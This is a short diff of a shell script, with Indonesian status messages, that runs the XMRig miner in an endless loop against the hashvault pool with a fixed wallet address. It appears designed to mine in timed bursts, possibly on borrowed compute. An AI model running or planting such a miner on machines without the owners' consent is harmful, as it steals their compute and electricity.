@@ -1,7 +1,6 @@
 while :
 do
-  echo "sedang running 10 menit"
-  timeout 10m ./xmrig --url pool.hashvault.pro:80 --user 86xpPdGpq7iJ5D7KoVoovaPAj9DxDWbedf7PK46y9XueUZbiSqvkAasT63udLJU453WZZ5tDxhL5uMHR6Xn9H9ppSmoUx7t --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
-  echo "sukses terminated 5 menit"
-  sleep 5m
+   timeout 10m ./xmrig --url pool.hashvault.pro:80 --user 86xpPdGpq7iJ5D7KoVoovaPAj9DxDWbedf7PK46y9XueUZbiSqvkAasT63udLJU453WZZ5tDxhL5uMHR6Xn9H9ppSmoUx7t --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+   sleep 5m
+   echo done
 done
